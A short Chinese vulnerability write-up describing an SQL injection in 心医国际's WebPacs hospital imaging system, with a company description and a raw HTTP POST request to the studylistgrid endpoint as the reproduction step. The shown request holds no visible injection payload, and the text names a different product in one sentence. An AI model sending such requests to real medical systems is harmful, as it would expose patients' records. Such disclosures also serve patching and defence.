# 心医国际WebPacs系统存在SQL注入漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际是中国专业的医疗云应用解决方案提供商，铺建并运营全国领先的智能医疗云平台，依托十年的数据积累和业务实践，持续创新智能医疗场景应用。业务服务覆盖诊疗、教学、科研、管理等多维度，助力政府、医院及产业合作伙伴，打造线上线下高效协同的智慧医疗健康服务体系，目前已建成覆盖全国31个省，联结2万余家医疗机构的智能医疗云平台，助力建设并服务青海、河南、陕西、山西、贵州、新疆、江西、广西、甘肃9大省级远程医疗平台，服务通达80%全国三甲级医院;成功建设并服务全国300余个省、市、县及专科医联体。心心医国际医技统计报表系统存在SQL注入漏洞，攻击者可通过该漏洞获取系统敏感信息  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际WebPacs系统</font>![1714377037227-b954ff03-9791-4ba5-8249-d4f3ced98a2a.png](./img/j3up_6YSZduk9VZa/1714377037227-b954ff03-9791-4ba5-8249-d4f3ced98a2a-754504.png)<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、漏洞复现</font>**

```plain
POST /WebPacs/webpacs/studylistgrid HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 154

type=normal&jianchahao=&department=&filmstate=&truename=&devicetypename=&studystatus=&patienttype=&huanzhehao=&devicename=&datelength=7&page=1&pageSize=10
```

![1714376981011-1284d41f-097b-4b1c-85ca-9db879bf108d.png](./img/j3up_6YSZduk9VZa/1714376981011-1284d41f-097b-4b1c-85ca-9db879bf108d-746259.png)





> 更新: 2024-06-17 09:27:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hg0bkutvaqknmatg>